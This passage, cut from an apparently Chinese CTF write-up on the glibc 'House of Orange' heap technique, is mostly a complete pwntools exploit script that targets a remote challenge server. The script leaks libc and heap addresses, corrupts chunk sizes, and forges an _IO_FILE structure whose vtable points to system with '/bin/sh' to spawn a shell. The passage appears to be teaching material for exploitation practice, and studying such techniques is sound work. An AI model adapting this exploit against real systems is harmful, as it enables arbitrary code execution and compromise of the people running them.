class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token comment\"># alignment to vtable</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>heapbase <span class=\"token operator\">+</span> <span class=\"token number\">0x23010</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># vtable 指向自己</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>sys_addr<span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_overflow 位置改为 system</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">19</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/houes-of-orange/image-20240715122127045.png\" alt=\"image-20240715122127045\"></p>\n<p><img data-src=\"/img/houes-of-orange/image-20240715122150872.png\" alt=\"image-20240715122150872\"></p>\n<h3 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp:</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"110.40.35.73:33791\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Mea</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'>\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">,</span>ct<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tMea<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Size :\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content :\\n'</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Edi</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>sz<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\tMea<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Size :\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content :\\n'</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\tMea<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x408</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xbf1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>libc_base <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x61</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x3C4B20</span> <span class=\"token operator\">+</span> <span class=\"token number\">16672</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>main_arena <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x7ffff7bc4b20</span> <span class=\"token operator\">-</span> libc_base<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> libc_base</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>io_list_all<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_list_all'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>sys_addr<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>payload<span class=\"token operator\">=</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4b1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0X600</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0X500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x508</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4d1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x508</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xaf1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0X500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x5b0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x508</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xae1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x600</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x521</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x4a0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>heapbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x1ba61</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'main_arena'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'heapbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libc_base'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token string\">b'B'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token operator\">-</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>p <span class=\"token operator\">+=</span> <span class=\"token string\">b'B'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre><span class=\"token comment\"># fake file</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token comment\"># flag overflow arg -> system('/bin/sh')</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x61</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\"># _IO_read_ptr small bin size</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre><span class=\"token comment\">#  unsoted bin attack</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_read_end)</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>io_list_all <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># _IO_read_base</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre></pre></td></tr><tr><td data-num=\"130\"></td><td><pre><span class=\"token comment\">#bypass check</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre><span class=\"token comment\"># 使 fp->_IO_write_base &lt; fp->_IO_write_ptr 绕过检查</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_write_base </span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_write_ptr</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token 